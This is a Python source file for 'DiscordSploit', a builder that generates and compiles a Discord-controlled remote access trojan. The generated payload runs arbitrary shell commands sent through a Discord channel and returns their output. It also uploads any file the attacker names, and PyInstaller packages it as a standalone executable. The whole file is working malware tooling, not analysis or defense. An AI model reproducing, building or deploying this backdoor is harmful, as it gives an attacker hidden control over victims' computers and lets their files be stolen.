import subprocess
import sys

LOGO = ("""
             ___  _                   _ ___      _     _ _   
            |   \(_)___ __ ___ _ _ __| / __|_ __| |___(_) |_ 
            | |) | (_-</ _/ _ \ '_/ _` \__ \ '_ \ / _ \ |  _|
            |___/|_/__/\__\___/_| \__,_|___/ .__/_\___/_|\__|
                                           |_|               
            DiscordSploit Version 0.1
            By sarsatra https://github.com/sarsatra/DiscordSploit
            'help' for help
""")
def shell():
    token = ''
    channelid = ''
    inputList = ["foo", "bar"]
    while True:
        _input = input("discordsploit # ")
        if ' ' in _input:
            inputList = _input.split(' ')
        if _input == "help":
            print("""
            Usage:
            	discordsploit # token 'token'
                discordsploit # channelid 'channelid'
            	discordsploit # create 'name'
            Commands:
            		options
                """)
        elif _input == "exit":
            sys.exit()
        elif _input == "options":
            print(f"""
            token > {token}
            channeild > {channelid}
            """)
        elif inputList[0] == "token" and "token " in _input:
            token = inputList[1]  
        elif inputList[0] == "channelid" and "channelid " in _input:
            channelid = inputList[1]
        elif inputList[0] == "create":
            name = inputList[1]
            file = open(f"{name}.pyw", "w")
            file.write(f"""
import discord
import subprocess
from discord.ext import commands
from discord.ext.commands import bot
bot = commands.Bot(command_prefix='#', help_command=None)
@bot.event
async def on_ready():
    await bot.get_channel({channelid}).send("`DiscordSploit is ready type #help for help.`")
@bot.command(name='help')
async def help(ctx):
    await ctx.send('''`cmd       Executes commands in shell
download  Downloads a file 
help      Shows this message`''')
@bot.command(pass_context=True)
async def cmd(ctx, *args):
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    await ctx.send("`" + str(out) + "`")
@bot.command(pass_context=True)
async def download(ctx, *args):
    joined = ' '.join(args)
    await ctx.send(joined , file=discord.File(joined))
bot.run('{token}')
            """)
       
            file.close()
            print("discordsploit # Creating exe with PyInstaller")
            proc = subprocess.call(["pyinstaller", "--onefile", f"{name}.pyw"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=False)
            print("Exe created in dist folder")
        else:
            print("Invalid command.")
       

if __name__ == "__main__":
	print(LOGO)
	shell()